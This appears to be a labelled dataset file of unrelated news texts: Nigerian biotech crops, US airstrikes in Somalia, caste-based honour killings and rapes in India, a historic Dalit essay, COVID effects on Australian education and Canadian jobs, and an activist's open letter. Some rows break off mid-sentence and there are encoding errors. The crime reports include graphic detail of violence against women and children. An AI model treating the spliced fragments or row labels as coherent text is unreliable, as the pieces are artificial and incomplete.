0,"The National Biotechnology Development Agency (NABDA), says Nigeria will be happy to transfer its technology behind biotech (bt) cotton, bt cowpea and others to other African countries to help boost agricultural productivity. Prof. Alex Akpa, the Director-General (DG) of NABDA, said this on Wednesday in Abuja during a courtesy visit by Commonwealth Students/Youth Federation for Peace. Akpa said it was very important that Nigeria should extend this technology to other African countries “and I assure you that we will be happy to do that.’’ The DG disclosed that the variety of bt cotton developed in Nigeria is between 4.2 to 4.5 tonnes per hectare. “In fact somebody who is a very enlightened farmer got 5 tonnes per hectare and reported that during the last field day in the agency; so you can imagine the dramatic increase. “The traditional variety gives you between 250 to 750 kilogram per hectare, that is less than one ton per hectare, so you can see the type of thing science can do,’’ he said. He told the visitors that NABDA had “also done bt cowpea’’, and that Nigeria is the first country in the world to develop bt cowpea, an important protein source for low income earners. He disclosed that cowpea (beans) was naturally prone to insect pest attacks, not only in the store but also in the field. “In the field there is a devastating pest called maruca which can eat up a 10 hectare farm in 10 days, which is a nightmare to farmers,’’ the DG said. Akpa further disclosed that the bt cowpea developed in Nigeria was resistant to the insect pest, maruca. He said not only that, tiny weevils also tend to eat them up during storage, converting them to dust. He added that out of desperation, business people and even some farmers had tried to preserve beans in the store by using “sniper, a very dangerous chemical’’. Akpa said although sniper was an effective pesticide, “but very dangerous, it kills humans’’. He said the good news was that “we do bio-fertilizer, bio-insecticide and also bio-fungicide.’’ According to him, the bio-insecticide is effective in preserving beans in storage by destroying the tiny weevils that destroy these produce in storage. He hinted that the bio-insecticide was “totally harmless to the environment and completely harmless to humans because they are normal microorganisms.’’ The NABDA boss also spoke on what the agency had done on yam seedlings and what they were planning to do this 2020. He expressed appreciation over the visit of the youth federation, saying he was honoured for making him their patron. Earlier, Mr Kewul Suleh, from Ghana and president of the federation said he spoke on behalf of the entire officials serving in the 2018/2022 leadership of the federation. Suleh extolled the virtues of the DG and steadfastness on his firm principles. The visitors also extended an invitation to the DG on their upcoming World Youth Summit to be held in Accra, Ghana.

0,"U.S. Africa Command conducted another precision airstrike in Somalia on Monday and successfully killed one Al-Shabaab terrorist. The airstrike took place in Jilib, Somalia, and did not result in any troops or civilians injured, according to an AFRICOM statement. “Our persistent actions against al-Shabaab ensures constant and continued pressure on this malign network,” said U.S. Army Brig. Gen. Miguel Castellanos, U.S. Africa Command deputy director of operations. “Our collective efforts help enhance security in the region and put al-Shabaab on notice, making both Somalia and the U.S. safer in the process,” Castellanos added. The strike is the ninth conducted by AFRICOM against Al-Shabaab in February alone. The nine strikes have collectively killed 11 Al-Shabaab terrorists and wounded several others, in addition to damaging or destroying multiple terrorist compounds. The latest strike comes just one day after a precision airstrike on Sunday killed three Al-Shabaab terrorists and destroyed their compound in Dujuuma, Somalia. Also on Sunday, another airstrike in Saakow, Somalia killed two terrorists, wounded one, and destroyed a terrorist compound, AFRICOM said in a statement. “Al-Shabaab kills regularly and indiscriminately,” Brig. Gen. Castellanos said. “This al-Qaida affiliate exploits innocent Somalis, displaces families, and imposes illegal taxes through force and violence. They want to export their vision of destruction more widely. It is our collective international efforts and persistent pressure that prevents this from occurring.” U.S. forces have been positioned in Africa for years, targeting both ISIS-Somalia terrorists and the Al-Qaeda affiliated Al-Shabaab terrorists. AFRICOM conducted more than 60 airstrikes in Somalia during 2019, setting a record. They previously conducted 47 airstrikes in 2018 and 35 in 2017. “Since al-Shabaab’s first external attack in 2010, the group has ruthlessly killed hundreds,” U.S. Army Maj. Gen. William Gayler, director of operations, U.S. Africa Command, said in a December 29 statement. “They have attacked and killed African partners, allies, and fellow Americans. They are a global menace and their sights are set on exporting violence regionally and eventually attacking the U.S. homeland,” Gayler added."
0,"The woman's father had initially filed a missing persons complaint. The Karnataka police on Friday arrested a 48-year-old farmer from Kudur in Ramanagara for allegedly killing his 18-year-old daughter for falling in love with a Dalit man. Eighteen-year-old Hemalatha's body was recovered in a mango grove in Magadi, about 60 km away from Bengaluru city, in a mango grove. The police said that Krishnappa, who is from the Vokkaliga community, a dominant caste, did not approve of his daughter's relationship with her boyfriend Puneet, who is from the Dalit community. On October 9, 48-year-old Krishnappa filed a missing persons complaint with the Kudur Police stating that his 18-year-old daughter Hemalatha, a first-year B.Com student, was missing. In his complaint, he alleged that he had gone to his farm to oversee some work and returned home at 4 pm to find that his daughter had gone missing. He had also said that a man named Puneet had been constantly calling his daughter for a few weeks. He had also indicated that he suspects Puneet's hand in her disappearance. The Kudur Police, who began the probe, picked up Puneet, a farm worker in Kudur, for questioning. Kudur Police said that after interrogating Puneet several times, they began to suspect foul play. ""Puneet told us that he and Hemalatha had been in love since she began going to college. He said that a few weeks ago, Krishnappa found out that Puneet and Hemalatha were in a relationship and wanted her to end it,"" Magadi Circle Inspector Manjunath told TNM. Puneet allegedly told the investigators that Krishnappa wanted Hemalatha to end the relationship. He also informed the police that Krishnappa told Hemalatha's cousins, Yogi (21) and a 17-year-old, to talk to Hemalatha and dissuade her from continuing the relationship. âWe just couldn't find anything suspicious about Puneet initially and his alibi was accurate too. There were witnesses who said he was working in the farm at the time of the disappearance. That's when we began suspecting Krishnappa,â the police said. On October 14, the police took Krishnappa into custody and questioned him as they suspected his hand in her disappearance. âHe kept changing his statement. He initially said he and his nephews killed her. He later said that he found her body when he dug up a pit to plant saplings in the mango grove. But, the interrogation of Yogi and the minor revealed that the three of them killed Hemalatha,"" Inspector Manjunath added. On October 15, the police picked up Yogi and interrogators with expertise in questioning juvenile suspects took the 17-year-old boy into custody. ""We learned that the three of them were involved in the murder,"" Inspector Manjunath said. Police said that on the evening of October 9, while Krishnappa was on the farm, Yogi and the minor boy allegedly got Hemalatha to the grove by telling her that her father was waiting for her. ""When they took her to the mango grove, Krishnappa and Hemalatha are believed to have had a fight. Based on Yogi's confession, we learned that Krishnappa told her that he would kill her. Yogi and the minor boy smashed a boulder on her head. Then the three men dug up a pit in the grove and buried her body,"" police added. The Kudur Police took Krishnappa to the spot where the body was buried and recovered the body on Friday. ""He is claiming that his nephews killed her and he later found the body when he dug up the pit to plant saplings. His testimony kept changing. Finally yesterday afternoon (Friday) he confessed to the crime. He said that his daughter's relationship with a Dalit man would have brought shame upon his family due to which he enlisted his nephews' help to kill her,"" Inspector Manjunath added. The Kudur Police registered an FIR under section 302 (murder), 120b (criminal conspiracy) and 34 (common intention) of the Indian Penal Code on Friday. ©2021 the news minute"
0,"A 20-year-old Dalit woman was allegedly sexually assaulted in Bairagarh locality near Bhopal and three persons were arrested in this connection, police said on Sunday. The incident occurred on Saturday night, police said. “Accused Dev Singh Rathore (40) allegedly raped the woman around 8.30 pm on Saturday.

After all, your library will probably be one of the most used rooms in your home. Therefore it’s a good idea to choose the best furniture that you can afford. A great place to start is to look for old and antique pieces that you can restore and put in your study area. It might sound like fun, but don’t let yourself be fooled – it will take some serious restoration work to be able to achieve a high quality library style. The type of furniture you purchase depends on the style you would like. There are many different styles available, including modern and classical. Some people like to have their walls completely decorated in wood in traditional style, while others like to use fabrics, and cotton wall coverings – which nicely complement modern furnishings like electric fireplaces. If you have a dedicated study area, it’s always nice to be able to choose the perfect colors and textures for your walls. Remember to keep in mind the theme you have chosen for your home. If you are interested in using dark woods for your furniture, then this should be applied to your study area as well. Research is the key when it comes to creating a library in your home. This is very important, and it’s something that should not be overlooked. Your research will allow you to know exactly where you want to place certain items. For example, if you are interested in placing furniture in this area that goes with certain books, then you need to research the various titles, authors, and other information about the books you would like to place here. This is very important, and you need to make sure that you do it right. Another important thing to research before building your library is the type of lighting you will need. It is important that you find a suitable location to place your lamps, or lights, so that they don’t create an eyesore. You can even find a lot of unique lamp shades online that will allow you to find the perfect shade for your home. Many people are very proud of their lamp shades, and this is a good thing because it allows them to enhance their home. The library you make at home should be decorated to your liking, but remember to place items that coordinate with your decor. Also, if you plan on placing a television in this area, then make sure that the size and color of the television matches with the decor. Some people are embarrassed to ask for help when they’re planning a home, and if you don’t feel comfortable asking for help, then you might want to reconsider the area you’re planning on placing a television. There are numerous books on how to make a hidden library at your home, and some of them are certainly worth looking into. When you are researching this topic, keep in mind the types of things you are looking to store in this space. Don’t place books on top of each other, as this will cause the books to crease. Also, don’t place several heavy books on one shelf, as this will cause the entire shelf to become unstable. By taking these simple precautions, you will have a wonderful storage area for your books at home. Your email address will not be published.

0,"the fully loaded magazine No ordinary event qualifies to become news. In India, sexual violence is an ordinary event. According to 2019 NCRB data, a woman is raped every 16 minutes in India. That means 88 women in a day…32,033 women in a year. But only a few such incidents are accorded ‘news value’. The Indian media could justify not covering all rapes with the famous journalistic adage of “dog bites man” not being news. Judged by that logic, one could say—without a tinge of humour—that rape in India is indeed as common as dog bites (50,000 a year). There are strong socio-cultural reasons for why the Indian media sensationalises a few rape cases and lets go of many others with a near-conspiratorial silence. If one may be blunt, the first response kicks in if the victim is from a dominant caste, urban, educated and fair. If it’s a rural woman, from an oppressed caste and dark, the news adorns itself with silence. Aligned to Hinduism’s centuries-old concept of touchables/untouchables, it seems rape and its severity can be categorised depending on... If you are not a subscriber ?

According to the Ministry of Transport, the old coaches were out of service and earmarked for refurbishment when they were set alight. “Security personnel noticed a group of young men at the yard and removed them from the property. The youths later returned and set fire to two coaches. “Services have not been disrupted, however, the fire has affected rolling stock availability and damaged critical cables at the depot,” the Ministry said. Investigations into the matter are ongoing. No arrests have been made.

0,"Here is a historical piece of writing by India’s first female Dalit writer Mukta Salve. At the time of writing this essay, she was merely 14 years old and a student at the school run by Jotirao and Savitribai Phule (Jotirao Phule, Ambedkar and others have written plainly about the plight of India’s Shudras-Atishudras – how much they have suffered due to the brahmanical system; how they have been forced to live like animals. But Mukta Salve gives us the perspective of a 14-year-old Dalit girl on this oppression. This first female Dalit writer vented her anger 165 years ago, in an essay she wrote for the Marathi fortnightly Gyanodaya. It was published in two parts under the title ‘Mang Maharachya Dukhvisayi’. The first part was published on 15 February 1855 and the second part on 1 March 1855. On this special occasion, we republish below Braj Ranjan Mani’s English translation of the essay. ) It humbles me to realize that God has filled the heart of an untouchable girl like me, considered to be even lower than an animal, with the pain and suffering of my people – the Mahars and Mangs. The Creator of all beings has put this in my heart and while invoking His name, I dare to pen this essay with the strength I have now received. The Creator is the one who created the Mangs, the Mahars and also the Brahmans and He is the one, who is filling me with wisdom to write. He will bless my labour with a fruitful outcome.  If we attempt to refute, on the basis of the Vedas, the argument of these gluttonous Brahmans, who hate us and consider themselves vastly superior, they say that the Vedas are their own domain, their exclusive property. Now apparently, if the Vedas are only for the Brahmans, they are obviously not for us. If the Vedas belong only to the Brahmans, then it is an open secret that we do not have the Book. We are without the Book – we are without any religion. If the Vedas are for the Brahmans only, then we are not bound to act according to the Vedas. If merely looking at the Vedas can get us into grievous sins (as the Brahmans claim), then would not following them be the height of foolishness? Muslims lead their life according to their Koran, English people follow their Bible and Brahmans have their own Vedas. Because they all have their own good or bad religion that they follow, they are somewhat happier than us who are without any religion. Oh, God, please tell us, what is our religion? Teach us, O God, your true religion so that we all can lead our lives according to it. Let that religion, where only one person is privileged and the rest deprived, vanish from the earth and let it never enter our minds to boast of such a [discriminatory] religion. Mukta Salve These people drove us, the poor Mangs, and Mahars, away from our own lands, which they occupied to build large buildings. And that was not all. They would make the Mangs and Mahars drink oil mixed with red lead and bury our people in the foundations of their buildings, thus wiping out generation after generation of our poor people. The Brahmans have degraded us so low; they consider people like us even lower than cows and buffaloes. Did they not consider us even lower than donkeys during the rule of Bajirao Peshwa? You beat a lame donkey, and his master retaliates. But who was there to object to the routine thrashing of Mahars and Mangs? Under Bajirao’s rule, if any Mang or Mahar happened to pass in front of a gymnasium, they would cut off his head and play “bat and ball” with their swords as bats and his head as a ball, on the grounds. When we were punished for even passing by their doors, where was the question of getting education, getting freedom to learn? When any Mang or Mahar would learn somehow to read and write, and if Bajirao came to know about this, he would say: education of a Mang or Mahar amounts to taking away a Brahman’s job. He used to say, “How dare they get educated? Do these Untouchables expect the Brahmans to hand over their official duties to them and move around with their shaving kits, shaving the heads of widows?” With such remarks he would punish them. An image of Mukta Salve’s piece on the pages of 15 February 1855 issue of ‘Gyanodaya’ Secondly, were these Brahmans satisfied with prohibiting us from learning? Not at all. Bajirao went to Kashi and died an ignominious death there. But the mahars here, no less untouchable than the Mangs, also avoid the company of the Mangs. They have acquired some brahmanical traits, and consider themselves to be superior to the Mangs – they also get polluted by the shadow of Mangs! Do the stony-hearted Brahmans, who proudly roam around in their so-called holy clothes to proclaim their superiority, ever feel even a frisson of compassion for us when we suffer so much on account of being labelled Untouchables? Nobody gives us employment because we are Untouchables. No job means no money. We have to endure grinding poverty. O learned pandits, fold up your selfish priestcraft and stop the prattle of your hollow wisdom and listen to what I have to say. When our women give birth to babies, they do not have even a roof over their heads. How they suffer in the rain and the cold! Please try to understand it from your own experience. If they get some disease while giving birth, where will they get money for the doctor or medicines? Was there ever any doctor among you who was human enough to treat such people free of cost? The masthead of the 15 February 1855 issue of ‘Gyanodaya’ The Mang and Mahar children never dare lodge a complaint even if the Brahman children throw stones at them and injure them seriously. They suffer silently because they know they have to go to the Brahmans’ houses to beg for the leftover food. Alas! O God! What agony this! I will burst into tears if I write more about this injustice. Because of such oppression, the merciful God has bestowed on us, this benevolent British government. Let us see how our pain has been mitigated under this government. Earlier, Gokhale, Apate, Trimkaji, Andhala, Pansara, Kale, Behre, etc [all Brahman surnames], who showed their bravery by killing rats in their homes, persecuted us, not sparing even pregnant women, without any rhyme or reason. This has stopped now. Harassment and torture of Mahars and Mangs, common during the rule of Peshwas in Pune, have stopped. Now, human sacrifice for the foundation of forts and mansions has stopped – now, nobody buries us alive. Now, our population is growing in numbers. Earlier, if any Mahar or Mang wore fine clothes, they would say that only Brahmans should wear such clothes. Seen in fine clothes, we were earlier accused of stealing such clothes. Their religion was in danger of being polluted when Untouchables put clothes around their bodies; they would tie them to a tree and punish them. But, under British rule, anybody with money can buy and wear clothes. Earlier, punishment for any wrongdoing against the upper castes was to behead the guilty Untouchable— now, it has stopped. Excessive and exploitative tax has stopped. The practice of untouchability has stopped in some places. Killing has stopped on the playground. Now, we can even visit the marketplace. Under the impartial British rule, many such things have happened. As I write this, I am amazed that the Brahmans who earlier used to treat us like dirt, as I have written above, want to free us from our suffering. Not all the Brahmans though. Those who are influenced by Satan continue to hate us like before. They target and outcaste the Brahmans who are trying to liberate us. Some noble souls have started schools for Mahars and Mangs, and such schools are supported by the merciful British government. O, the Mahars and Mangs, you are poor and sick. Only the medicine of knowledge will cure and heal you. It will take you away from wild beliefs and superstitions. You will become righteous and moral. It will stop your exploitation. People who treat you like animals, will not dare to treat you like that any more. So please work hard and study. Get educated and become good human beings. But I cannot even prove this. For example, those who have received good education also sometimes surprise us by doing very bad deeds! Mukta Salve was a student at the school run by Jotirao and Savitribai Phule. At merely 14 years of age, she wrote an essay about the plight of the Mangs and the Mahars and the way to relieve it. The essay was published in the Marathi magazine 'Gyanodaya' Savitribai Phule’s letters are still relatively unknown. They demonstrate her concerns for society, love for humanity, revolt against injustices, anger against the casteist mindset and hope for building an egalitarian society, writes Siddharth कम लोगों का ही ध्यान सावित्रीबाई फुले के पत्रों पर जाता है। सिद्धार्थ लिखते है कि सावित्रीबाई फुले के पत्रों में व्यापक समाज की चिंता, इंसानियत के प्रति गहरे प्रेम, अन्याय के प्रति तीखे विद्रोह, जातिवादी मानसिकता के खिलाफ आक्रोश और समता-आधारित समाज की आशाएं अभिव्यक्त हैं Those who have termed the revolt of 1857 as the first war for India’s independence are the fools who wanted freedom for the Hindus alone. It didn’t bother them that had the revolt succeeded by ill luck, the princely kingdoms would have perpetuated the system that had denied the Untouchables their basic human rights.

0,"Standard operational procedures for education providers in Australia are being relaxed so that discrepancies in attendance and facilitating online study can be accommodated, as the education sector pivots to cope with temporary travel restrictions from China. 50% of full-fee paying high school students in Australia are from China, with a new school year just beginning “Where providers determine that enrolment in a wholly online or distance learning mode of study is in the student’s best interest for semester 1 or trimester 1 2020, TEQSA will not pursue regulatory action,” announced industry regulator TEQSA. “ASQA acknowledge the challenges providers’ face,” reiterated Saxon Rice, chief commissioner at ASQA, which regulates VET and English language providers. “Providers may wish to consider extending online or distance components of courses for impacted overseas students during the first half of 2020 or implement similar measures.” Meanwhile, IEAA’s Phil Honeywood, the chair of a new Global Reputation Taskforce, has warned of a AUS$8 billion dollar risk as the travel ban impacts many of the 200,000 Chinese students typically hosted annually in the country. “Most of the new and continuing students have been caught off guard because many were brought home to celebrate Chinese new year,” he said. Swift & supportive action from @TEQSAGov to ensure #intlstudents can continue studies. Also shows the resources and talent our institutions have in #digital & #online to respond so quickly 👍🙏. For students- https://t.co/iIZQZEcIH6 aggregates all agency’s info in one place📱 https://t.co/c4pJDBK0WJ — Austrade_Education (@Austrade_Ed) February 1, 2020  While educators rally to work out how to deliver an education to Chinese students unable to get to Australia, Honeywood went on national TV to explain some of the many difficult dimensions to the situation. He underlined that 50% of full-fee paying high school students in Australia are from China, with a new school year just beginning. “We’ve got a massive impact across the whole range of the education sector,” he said. Some Chinese students have pets left in boarding kennels and are unable to return He also described accommodation operators getting in touch to alert him that some Chinese students, two years into a three year degree, have pets left in boarding kennels and are unable to return to Australia because of the travel ban. Honeywood also acknowledged there could be a challenge in “the extent to which the government of China is willing to facilitate online learning and video-based teaching by Australian schools and universities into China”. The Australian government announced a travel ban on February 1 for two weeks, for Chinese nationals entering the country, barring Australian citizens, permanent residents and their immediate family. Those able to enter are also being advised to self-quarantine for 14 days. An international student at UNSW was confirmed as being one of the 12 (at the time of publication) travellers having tested positive for coronavirus in Australia. The country’s largest university, Monash University in Melbourne, has delayed the start of classes on campus, while the University of Sydney is offering affected students additional time to enrol or defer. English Australia is holding a webinar with Austrade on Wednesday February 12 to focus on specific actions being undertaken to support English language students. IEAA and Austrade are also hosting a webinar for all stakeholders on Monday February 10. Meanwhile, social media was reporting that the overnight nature of the travel restrictions had created difficult scenes of Chinese students landing in Australia only to be told they had to return immediately. Universities Australia confirmed it held a meeting on February 3 with education minister Dan Tehan “to identify further measures to minimise disruption caused by new travel restrictions imposed on February 1″. “That offer of ‘maximum flexibility’ from government is so important,” said UA chair, professor Deborah Terry. “We appreciate the commitment to work closely together through the challenges this situation presents. Professor Terry said Australian universities and the government were “as one” in sending a strong message of support to our students in China. “To our students still in China – our care, concern and empathy are with you,” she said, underlining that the UA board will meet the minister again next week. Extolling support to Chinese students also onshore, Terry noted, “You are crucial members of our close-knit university communities – and we will meet this challenge together.” “We will meet this challenge together” Minister Tehan announced the formation of a Global Reputation Taskforce following a meeting of international education stakeholders on January 21 about the impacts the bushfire crisis has had. A participant of the Taskforce, the Independent Tertiary Education Council Australia, has said the impact of the coronavirus on the independent tertiary education sector is currently being assessed in order to develop strategies to support both students and providers. Australia’s independent tertiary education sector enjoys a strong international reputation, with independent providers supporting around 90% of all international students undertaking vocational education and training. Government data for February 2020 suggests that the vocational education and training sector was set to support some 13,604 students that were residents of China. Of these some 10,935 are already in Australia with a further 2,669 holding a student travel visa still outside the country, ITECA noted. “As new challenges arise, we’ll collaborate with the Australian government” “Our interest is in supporting these students through the current difficulties and ensuring that when current travel restrictions are lifted, the students are able to undertake their studies in Australia and access the quality outcomes that independent providers offer,” said Troy Williams, ITECA chief executive, in a statement on February 5. “As new challenges arise, we’ll collaborate with the Australian government on developing an appropriate response.” International education is the country’s fourth-biggest export industry and around 29% of all international students in Australian universities are from China, a number that is growing at around 10% per year.

0,"STORY CONTINUES BELOW THESE SALTWIRE VIDEOS By Julie Gordon OTTAWA (Reuters) - Black and South Asian women had among the highest unemployment rates in Canada in July, according to Statistics Canada figures published Friday that for the first time included race-based data. The coronavirus pandemic has been hard on Canadian women, who have trailed men in returning to pre-COVID-19 employment levels, in part because they are more likely to work in the face-to-face services sector. For women of color, the numbers are particularly steep. In July, the jobless rate for South Asian women aged 15 to 69 was 20.4%, while it was 20.3% for Arab women and 18.6% for black women. By comparison, the jobless rate for white women was 9.2%. Graphic https://graphics.reuters.com/gfx/rngs/HEALTH-CORONAVIRUS/dgkvldexovb/ ""What this pandemic has truly done is to shine a giant spotlight on all the disadvantages that were already there that we did not want to discuss,"" said Stephania Varalli, co-chief executive of Women of Influence, a networking organization for women of diverse backgrounds. Varalli said non-white women face challenges ranging from systematic racism, to being more likely to be employed in part-time or precarious work, to having less access to childcare or elder care options. ""It's a big and scary problem that will not be easy to resolve,"" she said. Canada added 418,500 jobs in July and the overall unemployment rate fell to 10.9%, StatsCan said on Friday. For both men and women aged 15 to 69, South Asians had the highest unemployment rate in July at 17.8%, followed by Arabs and Blacks at 17.3% and 16.8% respectively. Filipino Canadians, many of whom are frontline health and support workers, had the lowest jobless rate of the non-white groups at 13.2%, though their labor participation rate fell, suggesting some who lost their jobs have temporarily left the workforce. One bright spot has been female entrepreneurs, who have been versatile in adapting to changes brought on by the pandemic, Statistics Canada research shows. About 55% of businesses owned by women introduced new ways to interact with or sell to customers during the coronavirus shutdowns, while 34% modified their products, according to a StatsCan study released last month. These rates outpaced the average for all businesses. Evelyne Nyairo, a Kenyan-Canadian chemist and biologist who launched a skincare line in 2015, said COVID-19 changed her business overnight, cutting her supply chain and forcing her to lay off workers. She pivoted to making hand sanitizers in response to a Canadian government appeal. Within four weeks she had a hand sanitizer on the market and had refocused her broader product sales on end users, building direct relationships with consumers to drive repeat sales. ""People who were not our customers became our customers,"" said Nyairo, adding: ""It's challenging times. We don't know what tomorrow is going to look like, so I need to be flexible.""

Photo: Twitter Bad, bad behaviour is this. Hundreds of shoppers have been filmed filling up their trolleys at Makro and emptying shelves at will in a bid to stockpile goods during the coronavirus pandemic. Other department stores have also been hit by the chaos, but the aforementioned retailer became the venue of choice for our hoarders. Honestly, thereâ€™s not much we can say in support of the stockpilers. Especially those who ran to the store during business hours on a Monday. Vital supplies, such as toilet paper, cleaning items and hygeine-related products, have all been mercilessly gobbled up. The aisles have been left bare in several stores. Granted, itâ€™s not exclusively a South African problem. But itâ€™s still enough to tip ordinary South Africans into apoplexy. There will be people who canâ€™t get access to necessary supplies because of Mondayâ€™s madness. Makro did issue a statement on their coronavirus procedures, but they made no reference to the stockpilers. â€œMakro has various measures in place to maintain a clean and healthy environment in our stores, and we have ramped these up even further. we are dedicated to keeping our stores stocked and prices fair. â€œWe are working especially hard to replenish hand sanitisers, cleaning supplies, paper products, and other in-demand items as quickly as possible and at our everyday low prices. We are working equally hard to secure sanitising and cleaning supplies for our own use in our stores.â€ Get in the bin, pleaseâ€¦ More than 800 people in Makro Montague gardens today I think corana was there too pic.twitter.com/9olCQEEz7N This is Makro Strubens Valley l.

0,"Work of trainees in Iraq has enabled new understanding of objects going on show in UK For decades they have been part of the collection of the British Museum, appreciated for their individual significance but in many cases shorn of much of their context owing to the circumstances of their discovery and retrieval during the buccaneering period of early archaeology. Now dozens of important artefacts that were removed from Iraq in the late 19th and early 20th centuries are being brought back into focus in an exhibition drawing on groundbreaking discoveries made by Iraqi archaeologists amid the turbulence of the country’s recent history. Among the objects on display is a small dolerite statue dating to around 2130BC, purchased by the museum in the 1930s. It depicts a king called Gudea, who ruled the ancient city of Girsu, one of the world’s first urban civilisations, on the site of modern-day Tello in southern Iraq. The statue shows him in a position of prayer, as do many others of him, according to Sebastien Rey, a curator of ancient Mesopotamia at the museum. But while experts knew from written sources that Gudea constructed a temple in his city, no trace of it had been found. That changed thanks to a discovery made through the Iraq emergency heritage scheme, set up by the British Museum in 2015 to train local archaeologists in heritage protection at a time when many of the country’s historical sites were under threat from destruction by Islamists. By revisiting the site after decades, Rey and a team of local trainee archaeologists discovered not only the site of the king’s 4,000-year-old temple, but also a bakery attached to the temple where huge quantities of bread would have been produced as offerings to the gods. It is believed to be the first example of this kind of set-up in history, ranking it as an “absolutely 10/10 and beyond” discovery, Rey said. The purpose of other museum-owned items that have puzzled experts for decades has also become clear as a result of the heritage scheme digs. For example, a collection of inscribed cones: similar items were found inside the temple’s walls as talismanic deposits. Iraqi law forbids archaeological discoveries from being removed from the country, so the new finds will be represented in photographs, reconstructions and video alongside the museum’s own collection. The exhibition, titled Ancient Iraq: New Discoveries, will visit the Great North Museum in Newcastle and the University of Nottingham Museum between March and December."
0,"Maruthi Rao, the prime accused in the sensational Pranay Perumalla honour killing case in Telangana, was found dead in what appears to be a case of suicide. According to the police, the body of Rao was found in the Arya Vaishya Bhavan in Khairatabad on Sunday morning. The wife of Rao had claimed that he had been missing since Saturday. Police said they have not registered a case and it appeared that Rao had taken his own life.  ""Maruti Rao was found dead in the morning. He has committed suicide, the case has not yet registered. Further investigation underway,"" Saifabad Deputy Commissioner of Police said. He was the main accused in the murder of Pranay Perumalla, the 24-year-old Dalit man who was killed in September 2018. Perumalla was married to Amrutha, the daughter of Rao, who was against the marriage as the boy was a Dalit while Rao's family belonged to the upper caste. Pranay belonged to Madiga scheduled caste whereas Amrutha was from Vysya caste.  Perumalla was hacked to death by a hitman hired by Rao, in front of his mother and Amrutha who was pregnant at the time, outside a hospital in Miryalaguda while they were stepping out. The entire incident was caught on CCTV camera and had sent shockwaves across the state and the country. The CCTV images revealed that the attacker had conducted the recce of the area. Amrutha later told police that she suspected her father, Maruthi Rao, to be behind the murder because her family was against their marriage and wanted to have her child aborted.  He had allegedly paid Rs 1 crore to get Perumalla killed. During the investigation, it came to light that the assassins had made four previous attempts to kill him, but had failed. Rao, who was arrested in the case, was out on bail. In June last year, the police had filed the charge sheet in the case naming Rao as the prime accused and seven others, including Subash Sharma - the man who hacked Perumalla to death. Family members alleged that he ended life due to the harassment by the police. Amrutha, however, felt that her father could have ended his life due to the guilt of killing Pranay ""We have no clarity yet, my father might have committed suicide due to regret after they killed Pranay. I never spoke to him nor saw him after that."" Amrutha, who was pregnant at the time, has since given birth to a baby boy. Start a conversation, not a fire. Post with kindness.

Her body was found in a sugarcane field on Saturday. Two men from her village have been arrested. The incident reportedly took place on Friday in a village close to the Nepal border. Her body was found in the fields of one of the accused. The district police chief Satyendra Kumar said, ""The girl's post mortem has confirmed rape. The two accused had been arrested already. We will file charges for rape, murder and also book them under the National Security Act."" Meanwhile, the Lakhimpur Kheri police have now denied that the 13-year-old girl, who was raped and strangulated on Friday, was further brutalized when her eyes were gouged out and her tongue cut off. Lakhimpur Kheri SP Satendra Kumar said there was nothing in the post-mortem report that would suggest that the 13-year-old's eyes were gouged out or tongue was cut. ""There were scratches near her eyes which could be due to the sugarcane leaves. Her tongue was not cut,"" the SP said. He said that the girl's post-mortem report has confirmed sexual assault and strangulation. However, the police said, the post-mortem report did not suggest that the victim's eyes were gouged out or tongue was cut. SP Satendra Kumar said that the police have registered a case of murder and gangrape against the two accused. The two accused will also be charged under the National Security Act. The victim's father had said his daughter had been strangled. Her eyes had been gouged out and her tongue was cut, he had alleged. Samajwadi Party president Akhilesh Yadav said, in a tweet, that crime against women had reached an all-time high. He said that the brutal murder and rape of a minor was enough to shake humanity. उप्र के लखीमपुर खीरी में एक बेबस किशोरी से दुष्कर्म के बाद निर्मम हत्या इंसानियत को झकझोर देने वाली घटना है. भाजपाकाल में उप्र की बच्चियों व नारियों का उत्पीड़न चरम पर है. बलात्कार, अपहरण, अपराध व हत्याओं के मामले में भाजपा सरकार प्रश्रयकारी क्यों बन रही है? #NoMoreBJP — Akhilesh Yadav (@yadavakhilesh) August 16, 2020  Bahujan Samaj Party President Mayawati condemned the incident on Twitter calling it 'extremely shameful'. ""What is the difference between the governments of the Samajwadi Party and the present BJP if such incidents keep happening?"" she asked. यूपी के लखीमपुर खीरी के पकरिया गाँव में दलित नाबालिग के साथ बलात्कार के बाद फिर उसकी नृशंस हत्या अति-दुःखद व शर्मनाक। ऐसी घटनाओं से सपा व वर्तमान भाजपा सरकार में फिर क्या अन्तर रहा? सरकार आजमगढ़ के साथ खीरी के दोषियों के विरूद्ध भी सख्त कार्रवाई करे, बीएसपी की यह माँग है। — Mayawati (@Mayawati) August 15, 2020  Bhim Army chief Chandra Shekhar Azad also commented on the incident. ""Dalit oppression is at its peak under the BJP government... If it is not the jungle raj, then what is? Our daughters are not safe, our homes are not safe, there is an atmosphere of fear everywhere. Yogi Adityanath should resign,"" he said. It may be recalled that on August 6, a 6-year-old girl in Hapur district was kidnapped and raped. The police arrested the accused on Friday.

On Monday, the day before writer and activist Anand Telbumbde is due to surrender to prison authorities for allegedly being involved in a conspiracy to foment violence between Dalits and Marathas on January 1, 2018, and to assassinate Prime Minister Narendra Modi, he wrote an open letter to the people of India detailing how the authorities manufactured prejudice against him and others in the case. “I have an unblemished record of service for nearly five decades to this country in various roles in corporate world, as a teacher, as a civil rights activist and a public intellectual...,” Teltumbde wrote. “But at the fag end of my life, I am being charged for the heinous crime under the draconian UAPA [Unlawful Activities (Prevention) Act]. An individual like me obviously cannot counter the spirited propaganda of the government and its subservient media.” Nine other activists and lawyers have been in jail since 2018 and face trial for allegedly participating in the conspiracy. On April 8, the Supreme Court had given a week’s time to Teltumbde and rights activist Gautam Navlakha to surrender to prison authorities. They have been charged under the provisions of the Unlawful Activities Prevention Act and various sections of the Indian Penal Code following violence between Dalits and Marathas in the village of Bhima Koregaon near Pune on January 1, 2018. The clashes came a day after an event in Pune, called the Elgar Parishad, had been organised to commemorate the Battle of Bhima Koregaon in 1818 in which the Dalit soldiers fighting for the British Army had helped to defeat the Brahmin Peshwa rulers of the Maratha empire. One person died in violence during a bandh called by Dalit outfits on January 2. The Pune Police alleged that Teltumbde and Navlakha were among a group of people with Maoist links that had conspired to organise the violence and have also alleged that they plotted to kill Modi. The inquiry was later taken over by the National Investigation Agency. Here is the full text of Teltumbe’s letter. I am aware this may be completely drowned in the motivated cacophony of the Bharatiya Janata Party-Rashtriya Swayamsevak Sangh combine and the subservient media but I still think it may be worth talking to you as I do not know whether I would get another opportunity. Since August 2018, when the police raided my house in faculty housing complex of Goa Institute of Management, my world turned completely topsy-turvy. Never in my worst dream, could I imagine the 